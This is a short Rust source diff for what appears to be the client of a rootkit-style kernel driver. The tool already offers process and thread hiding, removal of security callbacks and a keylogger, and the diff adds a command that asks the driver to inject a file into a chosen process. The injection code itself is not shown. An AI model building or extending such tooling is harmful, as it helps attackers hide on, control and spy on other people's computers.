@@ -11,7 +11,8 @@ use {
         signature_process, terminate_process
     }, 
     thread::{enumerate_thread, hide_unhide_thread},
-    callback::{enumerate_callback, remove_callback, restore_callback}
+    callback::{enumerate_callback, remove_callback, restore_callback},
+    injection::injection_thread,
 };
 
 #[cfg(not(feature = "mapper"))]
@@ -22,6 +23,7 @@ mod driver;
 mod process;
 mod keylogger;
 mod thread;
+mod injection;
 mod module;
 
 #[cfg(not(feature = "mapper"))]
@@ -195,5 +197,8 @@ fn main() {
                 },
             }
         },
+        Commands::Injection { pid, path } => {
+            injection_thread(IOCTL_INJECTION, pid, path);
+        }
     }
 }
